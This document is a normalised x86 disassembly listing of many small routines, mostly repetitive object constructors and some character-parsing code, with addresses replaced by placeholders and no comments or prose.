je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_419ef7
add eax 0x28
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418154
push 0x0
mov eax sub_44afd4
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_419f16
lea esi [ eax + 0x8 ]
call sub_420542
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_419f16
add eax 0x28
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4181ce
push 0x0
mov eax sub_44afae
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_419f35
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_419f35
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41823f
push 0x0
mov eax sub_44af88
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_419f54
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_419f54
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4182b0
push 0x0
mov eax sub_44af62
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_419f73
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_419f73
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41834b
push 0x0
mov eax sub_44af3c
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_419f92
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_419f92
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4183bb
push 0x0
mov eax sub_44af16
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_419fb1
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_419fb1
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41842b
push 0x0
mov eax sub_44aef0
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_419fd0
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_419fd0
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41849b
push 0x0
mov eax sub_44aeca
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_419fef
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_419fef
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41850b
push 0x0
mov eax sub_44aea4
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_41a00e
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_41a00e
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41857b
push 0x0
mov eax sub_44ae7e
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_41a02d
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_41a02d
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4185eb
push 0x28
mov eax sub_44dd6f
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov esi ecx
mov edi edx
mov [ ebp - 0x34 ] eax
cmp esi edi
jne r-xdata
push edi
push esi
call sub_41b3c1
movzx ebx ax
xor eax eax
pop ecx
pop ecx
cmp ax bx
jne r-xdata
push 0x207
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov eax edi
lea esi [ ebp - 0x2c ]
call sub_414039
xor esi esi
mov [ ebp - 0x4 ] esi
mov ebx [ ebp - 0x1c ]
push 0x10
pop edi
cmp ebx esi
jbe r-xdata
mov ax bx
call sub_448681
retn 0x8
test bl 0x3
je r-xdata
mov ecx [ ebp - 0x2c ]
mov eax ecx
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
or ebx 0x3
add eax [ ebp - 0x1c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
lea eax [ ebp - 0x2c ]
mov al [ eax + esi ]
mov [ ebp - 0x30 ] al
mov eax [ ebp - 0x34 ]
mov ecx [ eax + 0x204 ]
push [ ebp - 0x30 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
push ecx
call sub_40aa61
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
movzx ebx ax
call sub_40487c
lea ecx [ ebp - 0x2c ]
mov [ ecx + esi ] al
inc esi
cmp esi ebx
jb r-xdata
lea ecx [ ebp - 0x2c ]
sub_4186cf
push 0x0
mov eax sub_44ae58
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_41a04c
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41a04c
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418746
push 0x0
mov eax sub_44ae32
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_41a06b
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41a06b
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4187bd
push 0x0
mov eax sub_44ae0c
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41a08a
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41a08a
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41882e
push 0x0
mov eax sub_44ade6
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41a0a9
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41a0a9
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41889f
push 0x0
mov eax sub_44adc0
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41a0c8
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41a0c8
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418910
push 0x0
mov eax sub_44ad9a
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_41a0e7
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41a0e7
add eax 0x14
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418987
push 0x8
mov eax sub_44bd67
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_41a163
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41b487
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4189ed
push 0x0
mov eax sub_44ad74
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ edi ] bl
call sub_41a106
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi [ ebp + 0xc ]
call sub_41a106
add eax 0x10
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418a5e
push 0x0
mov eax sub_44ad4e
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ edi ] bl
call sub_41a125
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi [ ebp + 0xc ]
call sub_41a125
add eax 0x14
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418acf
push 0x0
mov eax sub_44ad28
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_41a144
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41a144
add eax 0x10
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_418b46
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi eax
cmp [ esi ] edi
jne r-xdata
mov ecx [ esi ]
movsx eax [ ecx ]
sub eax 0x2d
je r-xdata
push 0x125
push r--data
push r--data
call sub_4258e2
add esp 0xc
push 0xa
sub eax 0xd
je r-xdata
inc ecx
cmp ecx edi
je r-xdata
sub eax 0x21
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ecx ] 0x5d
jne r-xdata
lea esi [ ecx + 0x1 ]
cmp esi edi
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0xd
jmp r-xdata
cmp [ esi ] 0x3d
push 0x134
mov ebx r--data
push ebx
setne al
mov edi r--data
push edi
push r--data
push 0x0
push eax
call sub_403978
cmp [ esi ] 0x2e
push 0x13a
push ebx
setne al
push edi
push r--data
push 0x0
push eax
call sub_403978
add esp 0x30
cmp [ esi ] 0x3a
jne r-xdata
inc ecx
mov [ esi ] ecx
cmp ecx edi
je r-xdata
dec eax
je r-xdata
inc ecx
mov [ esi ] ecx
mov eax [ ebp + 0x8 ]
inc esi
mov [ eax ] esi
push 0xc
jmp r-xdata
push 0x2
jmp r-xdata
cmp [ ecx ] 0x62
jne r-xdata
push 0x8
jmp r-xdata
dec eax
jne r-xdata
pop eax
push 0xb
jmp r-xdata
push 0x9
jmp r-xdata
sub_418c2a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi eax
movzx eax [ esi + 0x22 ]
xor ecx ecx
cmp cx ax
je r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ esi + 0x28 ]
cmp ecx eax
je r-xdata
and [ ebp - 0x4 ] ecx
mov ebx eax
cmp [ esi + 0x20 ] 0x0
je r-xdata
sub eax ecx
xor ebx ebx
sar eax 0x1
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xff
jle r-xdata
call sub_419dc1
pop edi
pop ebx
leave
retn
mov eax edi
call sub_41c995
movzx eax [ ecx + ebx * 2 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] eax
movzx ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ax [ eax + ecx * 2 ]
and ax bx
xor edx edx
cmp dx ax
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xff
jle r-xdata
call sub_419dc1
movzx ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ax [ eax + ecx * 2 ]
and ax [ ebp - 0x8 ]
xor edx edx
cmp dx ax
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ esi + 0x28 ]
sub eax ecx
inc ebx
sar eax 0x1
cmp ebx eax
jb r-xdata
sub_418ccd
push 0x8
mov eax sub_44bd2b
call sub_448595
xor esi esi
push 0x30
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41a207
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41b53b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_418d34
push 0x8
mov eax sub_44bcef
call sub_448595
xor esi esi
push 0x30
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41a2d1
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41b5ac
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_418dbe
push ebp
mov ebp esp
push ebx
push esi
movsx esi [ ebp + 0xc ]
movsx ebx al
cmp ebx esi
jg r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push edi
mov edi [ ebp + 0x8 ]
movzx ecx bl
call sub_419dc1
inc ebx
cmp ebx esi
jle r-xdata
pop edi
sub_418de6
push 0x8
mov eax sub_44bcb3
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x48
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_41a39b
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
call sub_41b61d
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_418e5a
push 0x8
mov eax sub_44bc6d
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x48
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_41a452
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
call sub_41b68e
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_418ece
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
pop edi
add esi 0x4
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov edi [ ebp + 0xc ]
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
sub_418f16
imul eax eax 0x18
add eax [ edx + 0x4 ]
push ebx
push esi
mov esi eax
mov bl [ esi + 0x8 ]
mov [ esi + 0x8 ] 0x0
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x8 ] bl
xor al al
mov al 0x1
jmp r-xdata
pop esi
pop ebx
retn
sub_418f83
push ebp
mov ebp esp
push esi
movsx esi [ ebp + 0xc ]
movsx ebx bl
cmp esi ebx
jg r-xdata
pop esi
pop ebp
retn 0xc
push edi
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
push esi
call [ eax + 0x8 ]
mov edi [ ebp + 0x8 ]
movzx ecx al
call sub_419dc1
inc esi
cmp esi ebx
jle r-xdata
pop edi
sub_418fb8
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebx + 0x14 ] 0x10
mov eax [ esi ]
push edi
mov [ ebp - 0x4 ] eax
jb r-xdata
mov edi ebx
jmp r-xdata
mov edi [ ebx ]
jmp r-xdata
cmp edi [ ebx + 0x1c ]
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
mov al [ eax ]
mov [ ebp - 0x8 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ edi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
xor al al
mov al 0x1
jmp r-xdata
inc edi
inc [ esi ]
pop edi
leave
retn 0x4
sub_41901c
push ebp
mov ebp esp
cmp [ edi + 0x14 ] 0x10
push ebx
push esi
mov esi eax
jb r-xdata
mov ebx edi
mov ebx [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_411426
mov ecx [ esi ]
push eax
movzx eax [ ebx ]
push eax
mov al 0x1
call sub_41b74f
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x4 ] eax
mov eax edi
call sub_415b35
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
pop ebp
retn 0x4
sub_419068
push ebp
mov ebp esp
cmp [ edx + 0x14 ] 0x10
push ebx
mov ebx [ esi ]
push edi
jb r-xdata
mov eax edx
jmp r-xdata
mov eax [ edx ]
jmp r-xdata
cmp eax [ edx + 0x1c ]
jne r-xdata
mov edi [ esi ]
cmp edi [ esi + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
xor al al
mov [ esi ] ebx
mov al 0x1
jmp r-xdata
inc eax
inc edi
mov [ esi ] edi
pop edi
pop ebx
pop ebp
retn 0x4
sub_4190b3
push ebp
mov ebp esp
cmp [ edi + 0x14 ] 0x10
push ebx
push esi
mov esi eax
jb r-xdata
mov ebx edi
mov ebx [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_411426
mov ecx [ esi ]
push eax
movzx eax [ ebx ]
push eax
xor al al
call sub_41b74f
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x4 ] eax
mov eax edi
call sub_415b35
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
pop esi
pop ebx
pop ebp
retn 0x4
sub_4190ff
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ edi ]
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
retn
inc eax
mov [ esi ] eax
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
retn
sub_419139
mov ecx [ edi ]
push esi
mov esi eax
cmp ecx [ edi + 0x10 ]
jne r-xdata
movzx ecx [ ecx ]
